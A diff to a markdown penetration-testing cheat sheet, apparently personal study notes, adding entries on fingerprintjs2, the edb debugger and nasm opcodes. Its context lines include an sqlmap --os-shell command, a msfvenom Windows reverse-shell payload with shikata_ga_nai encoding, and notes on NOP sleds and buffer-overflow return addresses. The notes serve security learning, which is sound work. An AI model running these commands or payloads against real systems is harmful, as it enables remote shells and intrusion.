@@ -301,6 +301,9 @@ sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 * Microsoft `TCPView` is a Windows Sysinternal tool that is able to show which process is using which port. kind of like `netstat`. `Ctrl + R` to disable resolving addresses for easier view.
 
 
+## fingerprintjs2
+[`fingerprintjs2`](https://github.com/fingerprintjs/fingerprintjs2) is a tool that uses `javascript` library that fingerprints client browser and underlying OS.
+
 # Pwn
 ## Immunity Debugger
 * To search for a constant string:
@@ -332,6 +335,17 @@ sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 ### Endianess
 We have to put our payload address in reverse order. The OS can store addresses and data in memory in Little or Big Endian. In little Endian format, the low order byte of the number is stored in the memory at the lowest address, and the high order byte at the highest address. Therefore, we have to construct the payload address in reverse order because we are overwriting the return address from the opposite direction.
 
+## `edb`
+Evan's debugger, `edb`, is another useful debugger in Linux.
+| Shortcut | Description |
+|:-----:|:------:|
+| `F7` | Steps into a function|
+| `F9` | Run a program|
+| `Alt + x` | Quit |
+| `Alt + F, A` | Attach a program |
+| `Ctrl + B` | Breakpoint manager |
+| `Ctrl + O` | Opcode search |
+
 ## Cyclic
 * Generate a pattern of length `800` characters
 ```
@@ -350,6 +364,8 @@ cyclic -l 0x68616175
 ## `msf-nasm_shell`
 `nasm`, the Netwide Assembler, is an assembler and disassembler for Intel x86 architecture. We can `msf-nasm_shell` use to find a corresponding Assembly Opcodes for a target Assembly code.
 ```
+nasm> nop
+00000000 90
 nasm> jmp esp
 00000000 FFE4
 ```
@@ -370,3 +386,5 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc -e x86/shika
 Note that we are constructing a encoded shellcode using `shikata_ga_nai`, which means that our shellcode is not directly executable and is prepended with a decoder stub. The job of this decoder stub is to iterate over the encoded shellcode and decode it. To accomplish this, the decoder stub needs to gather its own address in memory, and also look ahead to locate the encoded shellcode. The code will perform a series of assembly instructions to get its address in memory, which is also called `GetPC` routine. `GetPC` is a short routine that moves the value of `EIP`, aka `PC` or program counter, into another register. 
 
 Unfortunately, `shikata_ga_nai` decoder has a side effect that will modify the values at or around the top of the stack, this means that we cannot directly insert our payload right after offset. One solution is that we can move the encoded shellcode further back in our buffer (~20 bytes) and padded the gap with `0x90` (`NOP SLED`).
+
+
